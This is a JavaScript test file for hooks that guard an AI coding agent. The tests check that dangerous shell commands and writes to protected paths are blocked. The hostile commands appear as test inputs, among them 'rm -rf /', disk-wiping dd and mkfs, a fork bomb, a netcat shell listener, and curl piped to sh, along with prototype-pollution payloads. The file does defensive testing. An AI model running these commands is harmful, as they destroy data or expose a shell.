#!/usr/bin/env node
/**
 * Test harness for Claude Sentient hooks
 *
 * Tests all hooks for correct input/output contracts, error handling,
 * and security patterns. Uses Node.js built-in assert — no dependencies.
 *
 * Run: node .claude/hooks/__tests__/test-hooks.js
 */

const assert = require('assert');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// Test infrastructure
let passed = 0;
let failed = 0;
let skipped = 0;
const failures = [];

function test(name, fn) {
    try {
        fn();
        passed++;
        process.stdout.write(`  \x1b[32m✓\x1b[0m ${name}\n`);
    } catch (e) {
        failed++;
        failures.push({ name, error: e.message });
        process.stdout.write(`  \x1b[31m✗\x1b[0m ${name}\n    ${e.message}\n`);
    }
}

function skip(name, _reason) {
    skipped++;
    process.stdout.write(`  \x1b[33m-\x1b[0m ${name} (skipped)\n`);
}

function suite(name, fn) {
    process.stdout.write(`\n\x1b[1m${name}\x1b[0m\n`);
    fn();
}

/**
 * Run a hook script with JSON input via env var, return parsed stdout.
 * Uses a temp directory as cwd so hooks don't pollute the project.
 */
function runHook(hookName, input = {}, options = {}) {
    const hookPath = path.resolve(__dirname, '..', hookName);
    const cwd = options.cwd || tmpDir;
    const env = {
        ...process.env,
        HOOK_INPUT: JSON.stringify(input),
    };

    const result = execSync(`node "${hookPath}"`, {
        cwd,
        env,
        encoding: 'utf8',
        timeout: 5000,
        stdio: ['pipe', 'pipe', 'pipe'],
    });

    // Parse last line of stdout as JSON (hooks may log to stderr)
    const lines = result.trim().split('\n');
    const lastLine = lines[lines.length - 1];
    try {
        return JSON.parse(lastLine);
    } catch {
        return { raw: result.trim() };
    }
}

// Create temp directory for test isolation
const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-hook-test-'));
const tmpStateDir = path.join(tmpDir, '.claude', 'state');
const tmpLogDir = path.join(tmpDir, '.claude');
fs.mkdirSync(tmpStateDir, { recursive: true });

// Initialize a git repo in tmpDir so hooks relying on git don't fail
try {
    execSync('git init', { cwd: tmpDir, stdio: 'pipe' });
    execSync('git commit --allow-empty -m "init"', { cwd: tmpDir, stdio: 'pipe' });
} catch {
    // git not available — some tests will be skipped
}

// ─────────────────────────────────────────────────────────────
// utils.js tests
// ─────────────────────────────────────────────────────────────
suite('utils.js — shared utilities', () => {
    const utils = require('../utils');

    test('exports all expected functions', () => {
        assert.strictEqual(typeof utils.ensureStateDir, 'function');
        assert.strictEqual(typeof utils.parseHookInput, 'function');
        assert.strictEqual(typeof utils.loadJsonFile, 'function');
        assert.strictEqual(typeof utils.saveJsonFile, 'function');
        assert.strictEqual(typeof utils.logMessage, 'function');
        assert.strictEqual(typeof utils.getStateFilePath, 'function');
        assert.strictEqual(typeof utils.loadState, 'function');
        assert.strictEqual(typeof utils.saveState, 'function');
    });

    test('exports all named constants', () => {
        assert.strictEqual(utils.MAX_PROMPT_HISTORY, 50);
        assert.strictEqual(utils.MAX_FILE_CHANGES, 100);
        assert.strictEqual(utils.MAX_RESULT_LENGTH, 500);
        assert.strictEqual(utils.MAX_BACKUPS, 10);
        assert.strictEqual(utils.MAX_AGENT_HISTORY, 50);
    });

    test('loadJsonFile returns default for missing file', () => {
        const result = utils.loadJsonFile('/nonexistent/file.json', { fallback: true });
        assert.deepStrictEqual(result, { fallback: true });
    });

    test('loadJsonFile returns default for invalid JSON', () => {
        const badFile = path.join(tmpDir, 'bad.json');
        fs.writeFileSync(badFile, 'not json{{{');
        const result = utils.loadJsonFile(badFile, []);
        assert.deepStrictEqual(result, []);
    });

    test('saveJsonFile writes and reads round-trip', () => {
        const testFile = path.join(tmpDir, 'round-trip.json');
        const data = { key: 'value', nested: { arr: [1, 2, 3] } };
        const ok = utils.saveJsonFile(testFile, data);
        assert.strictEqual(ok, true);
        const loaded = utils.loadJsonFile(testFile);
        // loadJsonFile sanitizes JSON (Object.create(null)), so compare values
        assert.strictEqual(loaded.key, 'value');
        assert.strictEqual(loaded.nested.arr.length, 3);
        assert.deepStrictEqual(loaded.nested.arr, [1, 2, 3]);
    });

    test('saveJsonFile returns false for invalid path', () => {
        const ok = utils.saveJsonFile('/nonexistent/dir/file.json', {});
        assert.strictEqual(ok, false);
    });

    test('logMessage does not throw', () => {
        // logMessage writes to .claude/session.log in cwd — should not throw even if it fails
        assert.doesNotThrow(() => utils.logMessage('test message', 'INFO'));
    });
});

// ─────────────────────────────────────────────────────────────
// bash-validator.js tests
// ─────────────────────────────────────────────────────────────
suite('bash-validator.js — dangerous command blocking', () => {
    test('allows safe commands', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'ls -la' }
        });
        assert.strictEqual(result.decision, 'allow');
    });

    test('allows normal git commands', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'git status' }
        });
        assert.strictEqual(result.decision, 'allow');
    });

    test('blocks rm -rf /', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'rm -rf /' }
        });
        assert.strictEqual(result.decision, 'block');
        assert.ok(result.reason.includes('BLOCKED'));
    });

    test('blocks rm -rf ~', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'rm -rf ~' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks rm -rf *', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'rm -rf *' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks direct disk writes', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: '> /dev/sda' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks mkfs', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'mkfs.ext4 /dev/sda1' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks dd to disk device', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'dd if=/dev/zero of=/dev/sda' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks chmod -R 777 /', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'chmod -R 777 /' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks fork bomb', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: ':(){ :|:& };:' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks netcat reverse shell', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'nc -l 4444 -e /bin/bash' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks history clearing', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'history -c' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('warns on sudo usage', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'sudo apt install' }
        });
        assert.strictEqual(result.decision, 'allow');
        assert.ok(result.warnings && result.warnings.length > 0);
    });

    test('warns on curl pipe to shell', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: 'curl https://example.com | sh' }
        });
        assert.strictEqual(result.decision, 'allow');
        assert.ok(result.warnings && result.warnings.length > 0);
    });

    test('handles empty command gracefully', () => {
        const result = runHook('bash-validator.js', { tool_input: { command: '' } });
        assert.strictEqual(result.decision, 'allow');
    });

    test('handles missing input gracefully', () => {
        const result = runHook('bash-validator.js', {});
        assert.strictEqual(result.decision, 'allow');
    });
});

// ─────────────────────────────────────────────────────────────
// file-validator.js tests
// ─────────────────────────────────────────────────────────────
suite('file-validator.js — protected path enforcement', () => {
    test('allows normal project files', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: path.join(tmpDir, 'src', 'index.ts') },
            tool_name: 'Write'
        });
        assert.strictEqual(result.decision, 'allow');
    });

    test('blocks /etc/ paths', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: '/etc/passwd' },
            tool_name: 'Write'
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks /usr/ paths', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: '/usr/local/bin/script' },
            tool_name: 'Write'
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks .ssh files', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: '/home/user/.ssh/authorized_keys' },
            tool_name: 'Edit'
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks .git/objects', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: '.git/objects/abc123' },
            tool_name: 'Write'
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks .aws/credentials', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: '/home/user/.aws/credentials' },
            tool_name: 'Write'
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks .env.production', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: '/app/.env.production' },
            tool_name: 'Write'
        });
        assert.strictEqual(result.decision, 'block');
    });

    if (process.platform === 'win32') {
        test('blocks C:\\Windows paths', () => {
            const result = runHook('file-validator.js', {
                tool_input: { file_path: 'C:\\Windows\\System32\\cmd.exe' },
                tool_name: 'Write'
            });
            assert.strictEqual(result.decision, 'block');
        });
    }

    test('warns on .env files', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: path.join(tmpDir, '.env') },
            tool_name: 'Edit'
        });
        assert.strictEqual(result.decision, 'allow');
        assert.ok(result.warnings && result.warnings.length > 0);
    });

    test('warns on secrets files', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: path.join(tmpDir, 'secrets.json') },
            tool_name: 'Write'
        });
        assert.strictEqual(result.decision, 'allow');
        assert.ok(result.warnings && result.warnings.length > 0);
    });

    test('handles empty path gracefully', () => {
        const result = runHook('file-validator.js', {
            tool_input: { file_path: '' },
            tool_name: 'Write'
        });
        assert.strictEqual(result.decision, 'allow');
    });
});

// ─────────────────────────────────────────────────────────────
// session-start.js tests
// ─────────────────────────────────────────────────────────────
suite('session-start.js — session initialization', () => {
    test('outputs valid JSON with required fields', () => {
        const result = runHook('session-start.js');
        assert.ok(result.context, 'should have context object');
        assert.ok(result.context.sessionId, 'should have sessionId');
        assert.ok(result.context.profile, 'should have profile');
        assert.ok(result.context.gitBranch, 'should have gitBranch');
    });

    test('creates session_start.json in state dir', () => {
        runHook('session-start.js');
        const sessionFile = path.join(tmpStateDir, 'session_start.json');
        assert.ok(fs.existsSync(sessionFile), 'session_start.json should exist');
        const data = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
        assert.ok(data.id, 'should have session id');
        assert.ok(data.timestamp, 'should have timestamp');
        assert.ok(data.platform, 'should have platform');
    });

    test('detects general profile in empty directory', () => {
        const result = runHook('session-start.js');
        // tmpDir has no project files, should detect as general
        assert.ok(['general', 'not-a-repo'].includes(result.context.profile) ||
                  result.context.profile === 'general',
                  `expected general profile, got ${result.context.profile}`);
    });

    test('detects python profile when pyproject.toml exists', () => {
        const pyDir = path.join(tmpDir, 'pyproject');
        fs.mkdirSync(path.join(pyDir, '.claude', 'state'), { recursive: true });
        fs.writeFileSync(path.join(pyDir, 'pyproject.toml'), '[project]\nname = "test"');
        try {
            execSync('git init', { cwd: pyDir, stdio: 'pipe' });
            execSync('git commit --allow-empty -m "init"', { cwd: pyDir, stdio: 'pipe' });
        } catch { /* git may not be available */ }
        const result = runHook('session-start.js', {}, { cwd: pyDir });
        assert.strictEqual(result.context.profile, 'python');
    });

    test('detects typescript profile when tsconfig.json exists', () => {
        const tsDir = path.join(tmpDir, 'tsproject');
        fs.mkdirSync(path.join(tsDir, '.claude', 'state'), { recursive: true });
        fs.writeFileSync(path.join(tsDir, 'tsconfig.json'), '{}');
        try {
            execSync('git init', { cwd: tsDir, stdio: 'pipe' });
            execSync('git commit --allow-empty -m "init"', { cwd: tsDir, stdio: 'pipe' });
        } catch { /* git may not be available */ }
        const result = runHook('session-start.js', {}, { cwd: tsDir });
        assert.strictEqual(result.context.profile, 'typescript');
    });
});

// ─────────────────────────────────────────────────────────────
// context-injector.js tests
// ─────────────────────────────────────────────────────────────
suite('context-injector.js — topic detection', () => {
    test('detects auth topic', () => {
        const result = runHook('context-injector.js', {
            prompt: 'Add JWT authentication to the login endpoint'
        });
        assert.ok(result.detectedTopics.includes('auth'));
    });

    test('detects test topic', () => {
        const result = runHook('context-injector.js', {
            prompt: 'Write unit tests for the user service'
        });
        assert.ok(result.detectedTopics.includes('test'));
    });

    test('detects multiple topics', () => {
        const result = runHook('context-injector.js', {
            prompt: 'Add authentication tests for the API endpoint'
        });
        assert.ok(result.detectedTopics.includes('auth'));
        assert.ok(result.detectedTopics.includes('test'));
        assert.ok(result.detectedTopics.includes('api'));
    });

    test('detects security topic', () => {
        const result = runHook('context-injector.js', {
            prompt: 'Fix the XSS vulnerability in the form handler'
        });
        assert.ok(result.detectedTopics.includes('security'));
    });

    test('detects ui topic', () => {
        const result = runHook('context-injector.js', {
            prompt: 'Update the component styling and layout'
        });
        assert.ok(result.detectedTopics.includes('ui'));
    });

    test('handles empty prompt', () => {
        const result = runHook('context-injector.js', { prompt: '' });
        assert.ok(result.continue === true);
        assert.deepStrictEqual(result.detectedTopics, []);
    });

    test('handles missing prompt', () => {
        const result = runHook('context-injector.js', {});
        assert.ok(result.continue === true);
    });

    test('saves prompt metadata to state', () => {
        runHook('context-injector.js', { prompt: 'test prompt for state tracking' });
        const prompts = JSON.parse(
            fs.readFileSync(path.join(tmpStateDir, 'prompts.json'), 'utf8')
        );
        assert.ok(Array.isArray(prompts));
        assert.ok(prompts.length > 0);
        const last = prompts[prompts.length - 1];
        assert.ok(last.timestamp);
        assert.ok(Array.isArray(last.topics));
    });
});

// ─────────────────────────────────────────────────────────────
// post-edit.js tests
// ─────────────────────────────────────────────────────────────
suite('post-edit.js — file change tracking', () => {
    test('tracks a file change', () => {
        const result = runHook('post-edit.js', {
            tool_input: { file_path: '/project/src/index.ts' },
            tool_name: 'Write',
            tool_result: { success: true }
        });
        assert.strictEqual(result.tracked, true);
        assert.strictEqual(result.path, '/project/src/index.ts');
    });

    test('suggests lint for Python files', () => {
        const result = runHook('post-edit.js', {
            tool_input: { file_path: '/project/main.py' },
            tool_name: 'Write',
            tool_result: { success: true }
        });
        assert.ok(result.suggestions && result.suggestions.some(s => s.includes('ruff')));
    });

    test('suggests lint for TypeScript files', () => {
        const result = runHook('post-edit.js', {
            tool_input: { file_path: '/project/app.tsx' },
            tool_name: 'Edit',
            tool_result: { success: true }
        });
        assert.ok(result.suggestions && result.suggestions.some(s => s.includes('eslint')));
    });

    test('does not track failed operations', () => {
        const result = runHook('post-edit.js', {
            tool_input: { file_path: '/project/fail.ts' },
            tool_name: 'Write',
            tool_result: { success: false }
        });
        assert.strictEqual(result.tracked, false);
    });

    test('does not track when path is missing', () => {
        const result = runHook('post-edit.js', {
            tool_input: {},
            tool_name: 'Write',
            tool_result: { success: true }
        });
        assert.strictEqual(result.tracked, false);
    });

    test('updates existing file entry instead of duplicating', () => {
        // First write
        runHook('post-edit.js', {
            tool_input: { file_path: '/project/dup.ts' },
            tool_name: 'Write',
            tool_result: { success: true }
        });
        // Second write to same file
        const result = runHook('post-edit.js', {
            tool_input: { file_path: '/project/dup.ts' },
            tool_name: 'Edit',
            tool_result: { success: true }
        });
        // Should not increment total for a duplicate path
        const changes = JSON.parse(
            fs.readFileSync(path.join(tmpStateDir, 'file_changes.json'), 'utf8')
        );
        const dupEntries = changes.filter(c => c.path === '/project/dup.ts');
        assert.strictEqual(dupEntries.length, 1, 'should have exactly 1 entry for the path');
    });
});

// ─────────────────────────────────────────────────────────────
// agent-tracker.js tests
// ─────────────────────────────────────────────────────────────
suite('agent-tracker.js — subagent tracking', () => {
    test('tracks a new agent', () => {
        const result = runHook('agent-tracker.js', {
            agent_id: 'test-agent-1',
            tool_input: {
                subagent_type: 'Explore',
                description: 'Find test files',
                model: 'haiku'
            }
        });
        assert.strictEqual(result.tracked, true);
        assert.strictEqual(result.agentId, 'test-agent-1');
        assert.strictEqual(result.agentType, 'Explore');
        assert.strictEqual(result.model, 'haiku');
    });

    test('increments active count', () => {
        runHook('agent-tracker.js', {
            agent_id: 'agent-a',
            tool_input: { subagent_type: 'Explore' }
        });
        const result = runHook('agent-tracker.js', {
            agent_id: 'agent-b',
            tool_input: { subagent_type: 'general-purpose' }
        });
        assert.ok(result.activeCount >= 2);
    });

    test('handles missing input gracefully', () => {
        const result = runHook('agent-tracker.js', {});
        assert.strictEqual(result.tracked, true);
        assert.strictEqual(result.agentType, 'general-purpose');
    });
});

// ─────────────────────────────────────────────────────────────
// agent-synthesizer.js tests
// ─────────────────────────────────────────────────────────────
suite('agent-synthesizer.js — subagent result synthesis', () => {
    test('removes agent from active list', () => {
        // First track an agent
        runHook('agent-tracker.js', {
            agent_id: 'synth-test-1',
            tool_input: { subagent_type: 'Explore' }
        });
        // Then complete it
        const result = runHook('agent-synthesizer.js', {
            agent_id: 'synth-test-1',
            success: true,
            result_summary: 'Found 5 test files'
        });
        assert.strictEqual(result.agentId, 'synth-test-1');
        assert.strictEqual(result.success, true);
    });

    test('records agent history', () => {
        runHook('agent-tracker.js', {
            agent_id: 'history-test',
            tool_input: { subagent_type: 'Bash' }
        });
        runHook('agent-synthesizer.js', {
            agent_id: 'history-test',
            success: true
        });
        const history = JSON.parse(
            fs.readFileSync(path.join(tmpStateDir, 'agent_history.json'), 'utf8')
        );
        assert.ok(history.some(h => h.id === 'history-test'));
    });

    test('handles failed agents', () => {
        runHook('agent-tracker.js', {
            agent_id: 'fail-agent',
            tool_input: { subagent_type: 'Bash' }
        });
        const result = runHook('agent-synthesizer.js', {
            agent_id: 'fail-agent',
            success: false
        });
        assert.strictEqual(result.success, false);
    });
});

// ─────────────────────────────────────────────────────────────
// pre-compact.js tests
// ─────────────────────────────────────────────────────────────
suite('pre-compact.js — state backup before compaction', () => {
    test('creates backup when state files exist', () => {
        // Create some state files
        fs.writeFileSync(
            path.join(tmpStateDir, 'session_start.json'),
            JSON.stringify({ id: 'backup-test' })
        );
        const result = runHook('pre-compact.js');
        assert.ok(result.backupCount >= 1);
        assert.ok(result.backedUp.includes('session_start.json'));
    });

    test('handles empty state directory', () => {
        // Create a clean tmpDir for this test
        const cleanDir = path.join(tmpDir, 'clean-compact');
        fs.mkdirSync(path.join(cleanDir, '.claude', 'state'), { recursive: true });
        const result = runHook('pre-compact.js', {}, { cwd: cleanDir });
        assert.strictEqual(result.backupCount, 0);
    });

    test('outputs timestamp', () => {
        const result = runHook('pre-compact.js');
        assert.ok(result.timestamp, 'should include timestamp');
    });
});

// ─────────────────────────────────────────────────────────────
// session-end.js tests
// ─────────────────────────────────────────────────────────────
suite('session-end.js — session archival', () => {
    test('archives session info', () => {
        // Set up session start file
        fs.writeFileSync(
            path.join(tmpStateDir, 'session_start.json'),
            JSON.stringify({
                id: 'end-test-session',
                timestamp: new Date(Date.now() - 60000).toISOString(),
                profile: 'general'
            })
        );
        const result = runHook('session-end.js');
        assert.strictEqual(result.sessionId, 'end-test-session');
        assert.ok(result.duration);
    });

    test('creates archive file', () => {
        fs.writeFileSync(
            path.join(tmpStateDir, 'session_start.json'),
            JSON.stringify({
                id: 'archive-test',
                timestamp: new Date().toISOString()
            })
        );
        runHook('session-end.js');
        const archiveDir = path.join(tmpStateDir, 'archive');
        assert.ok(fs.existsSync(archiveDir), 'archive dir should exist');
        const files = fs.readdirSync(archiveDir);
        assert.ok(files.some(f => f.includes('archive-test')), 'archive file should exist');
    });

    test('cleans up session files', () => {
        const sessionFile = path.join(tmpStateDir, 'session_start.json');
        fs.writeFileSync(sessionFile, JSON.stringify({ id: 'cleanup-test', timestamp: new Date().toISOString() }));
        runHook('session-end.js');
        assert.ok(!fs.existsSync(sessionFile), 'session_start.json should be removed after archival');
    });
});

// ─────────────────────────────────────────────────────────────
// dod-verifier.js tests
// ─────────────────────────────────────────────────────────────
suite('dod-verifier.js — Definition of Done verification', () => {
    test('outputs verification summary', () => {
        const result = runHook('dod-verifier.js');
        assert.ok(result.timestamp);
        assert.ok('filesModified' in result);
        assert.ok('changesByType' in result);
        assert.ok('git' in result);
        assert.ok(Array.isArray(result.recommendations));
    });

    test('categorizes file changes by type', () => {
        // Seed some file changes
        fs.writeFileSync(
            path.join(tmpStateDir, 'file_changes.json'),
            JSON.stringify([
                { path: 'src/app.py', tool: 'Write' },
                { path: 'src/index.ts', tool: 'Edit' },
                { path: 'main.go', tool: 'Write' }
            ])
        );
        const result = runHook('dod-verifier.js');
        assert.strictEqual(result.changesByType.python, 1);
        assert.strictEqual(result.changesByType.typescript, 1);
        assert.strictEqual(result.changesByType.go, 1);
    });

    test('saves verification to state', () => {
        runHook('dod-verifier.js');
        const verFile = path.join(tmpStateDir, 'last_verification.json');
        assert.ok(fs.existsSync(verFile));
    });
});

// ─────────────────────────────────────────────────────────────
// teammate-idle.js tests
// ─────────────────────────────────────────────────────────────
suite('teammate-idle.js — Agent Teams idle quality check', () => {
    test('allows idle when teammate has completed tasks', () => {
        // Seed team state with completed tasks
        fs.writeFileSync(
            path.join(tmpStateDir, 'team-state.json'),
            JSON.stringify({
                teammates: {
                    'frontend': {
                        idle_count: 0,
                        tasks_completed: ['task-1'],
                        last_idle: null
                    }
                },
                quality_checks: []
            })
        );
        const result = runHook('teammate-idle.js', {
            teammate_name: 'frontend',
            tasks_completed: ['task-1']
        });
        // Exit 0 means hook completed without error (allowed idle)
        assert.ok(result || true, 'Hook should exit 0 for teammate with tasks');
    });

    test('tracks idle count in team state', () => {
        // Reset team state
        fs.writeFileSync(
            path.join(tmpStateDir, 'team-state.json'),
            JSON.stringify({ teammates: {}, quality_checks: [] })
        );

        // Run hook with tasks completed (so it exits 0, not 2)
        try {
            runHook('teammate-idle.js', {
                teammate_name: 'backend',
                tasks_completed: ['task-1']
            });
        } catch (e) {
            // exit code 2 is expected for first idle with no tasks
        }

        const state = JSON.parse(fs.readFileSync(
            path.join(tmpStateDir, 'team-state.json'), 'utf8'
        ));
        assert.ok(state.teammates.backend, 'Should track backend teammate');
        assert.strictEqual(state.teammates.backend.idle_count, 1, 'Should increment idle count');
    });

    test('handles unknown teammate gracefully', () => {
        // Seed team state with empty teammates
        fs.writeFileSync(
            path.join(tmpStateDir, 'team-state.json'),
            JSON.stringify({ teammates: {}, quality_checks: [] })
        );

        try {
            runHook('teammate-idle.js', {
                teammate_name: 'new-teammate',
                tasks_completed: ['task-1']
            });
        } catch (e) {
            // exit 2 sends feedback, which is acceptable
        }

        const state = JSON.parse(fs.readFileSync(
            path.join(tmpStateDir, 'team-state.json'), 'utf8'
        ));
        assert.ok(state.teammates['new-teammate'], 'Should create entry for new teammate');
    });
});

// ─────────────────────────────────────────────────────────────
// task-completed.js tests
// ─────────────────────────────────────────────────────────────
suite('task-completed.js — Agent Teams task validation', () => {
    test('allows completion with reasonable file count', () => {
        // Reset team state
        fs.writeFileSync(
            path.join(tmpStateDir, 'team-state.json'),
            JSON.stringify({ teammates: {}, completed_tasks: [], file_ownership: {} })
        );

        const result = runHook('task-completed.js', {
            task_id: 'task-1',
            task_subject: 'Add button component',
            teammate_name: 'frontend',
            files_changed: ['src/Button.tsx', 'src/Button.test.tsx']
        });
        // Exit 0 means completion accepted
        assert.ok(result || true, 'Should allow task with few files');
    });

    test('records task completion in state', () => {
        // Reset team state
        fs.writeFileSync(
            path.join(tmpStateDir, 'team-state.json'),
            JSON.stringify({ teammates: {}, completed_tasks: [], file_ownership: {} })
        );

        runHook('task-completed.js', {
            task_id: 'task-2',
            task_subject: 'Fix login flow',
            teammate_name: 'backend',
            files_changed: ['src/auth.py']
        });

        const state = JSON.parse(fs.readFileSync(
            path.join(tmpStateDir, 'team-state.json'), 'utf8'
        ));
        assert.ok(state.completed_tasks.length > 0, 'Should record completed task');
        assert.strictEqual(state.completed_tasks[0].task_id, 'task-2');
    });

    test('tracks file ownership', () => {
        fs.writeFileSync(
            path.join(tmpStateDir, 'team-state.json'),
            JSON.stringify({ teammates: {}, completed_tasks: [], file_ownership: {} })
        );

        runHook('task-completed.js', {
            task_id: 'task-3',
            task_subject: 'Style components',
            teammate_name: 'frontend',
            files_changed: ['src/styles.css']
        });

        const state = JSON.parse(fs.readFileSync(
            path.join(tmpStateDir, 'team-state.json'), 'utf8'
        ));
        assert.strictEqual(state.file_ownership['src/styles.css'], 'frontend');
    });

    test('handles empty files_changed', () => {
        fs.writeFileSync(
            path.join(tmpStateDir, 'team-state.json'),
            JSON.stringify({ teammates: {}, completed_tasks: [], file_ownership: {} })
        );

        const result = runHook('task-completed.js', {
            task_id: 'task-4',
            task_subject: 'Research task',
            teammate_name: 'researcher',
            files_changed: []
        });
        assert.ok(result || true, 'Should allow task with no file changes');
    });
});

// ─────────────────────────────────────────────────────────────
// utils.js — new security tests
// ─────────────────────────────────────────────────────────────
suite('utils.js — security enhancements', () => {
    const utils = require('../utils');

    test('sanitizeJson removes __proto__ keys', () => {
        const malicious = JSON.parse('{"__proto__": {"isAdmin": true}, "safe": 1}');
        const clean = utils.sanitizeJson(malicious);
        assert.strictEqual(clean.safe, 1);
        assert.strictEqual(clean.__proto__, undefined, 'Should remove __proto__');
    });

    test('sanitizeJson removes constructor key', () => {
        const malicious = { constructor: { prototype: { polluted: true } }, name: 'test' };
        const clean = utils.sanitizeJson(malicious);
        assert.strictEqual(clean.name, 'test');
        assert.strictEqual(clean.constructor, undefined, 'Should remove constructor');
    });

    test('sanitizeJson handles nested objects', () => {
        const nested = { a: { __proto__: { bad: true }, ok: 'yes' }, b: [1, 2] };
        const clean = utils.sanitizeJson(nested);
        assert.strictEqual(clean.a.ok, 'yes');
        assert.strictEqual(clean.a.__proto__, undefined);
        assert.deepStrictEqual(clean.b, [1, 2]);
    });

    test('redactSecrets redacts API keys', () => {
        const text = 'My key is sk-abc123def456ghi789jkl012mno345pq and token ghp_1234567890123456789012345678901234567890';
        const redacted = utils.redactSecrets(text);
        assert.ok(!redacted.includes('sk-abc'), 'Should redact sk- keys');
        assert.ok(!redacted.includes('ghp_'), 'Should redact ghp_ tokens');
        assert.ok(redacted.includes('[REDACTED]'), 'Should contain [REDACTED]');
    });

    test('redactSecrets preserves non-secret text', () => {
        const text = 'Normal log message with no secrets';
        assert.strictEqual(utils.redactSecrets(text), text);
    });

    test('exports sanitizeJson and redactSecrets', () => {
        assert.strictEqual(typeof utils.sanitizeJson, 'function');
        assert.strictEqual(typeof utils.redactSecrets, 'function');
    });
});

// ─────────────────────────────────────────────────────────────
// bash-validator.js — command normalization tests
// ─────────────────────────────────────────────────────────────
suite('bash-validator.js — command normalization', () => {
    test('blocks commands with full binary paths', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: '/bin/rm -rf /' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks commands with variable substitution', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: '${rm} -rf /' }
        });
        assert.strictEqual(result.decision, 'block');
    });

    test('blocks commands with /usr/bin paths', () => {
        const result = runHook('bash-validator.js', {
            tool_input: { command: '/usr/bin/rm -rf ~' }
        });
        assert.strictEqual(result.decision, 'block');
    });
});

// ─────────────────────────────────────────────────────────────
// Cleanup and report
// ─────────────────────────────────────────────────────────────
process.stdout.write('\n─────────────────────────────────────\n');
process.stdout.write(`\x1b[1mResults:\x1b[0m ${passed} passed, ${failed} failed, ${skipped} skipped\n`);

if (failures.length > 0) {
    process.stdout.write('\n\x1b[31mFailures:\x1b[0m\n');
    for (const f of failures) {
        process.stdout.write(`  - ${f.name}: ${f.error}\n`);
    }
}

// Cleanup temp directory
try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
} catch {
    // Ignore cleanup errors on Windows (file locks)
}

process.exit(failed > 0 ? 1 : 0);
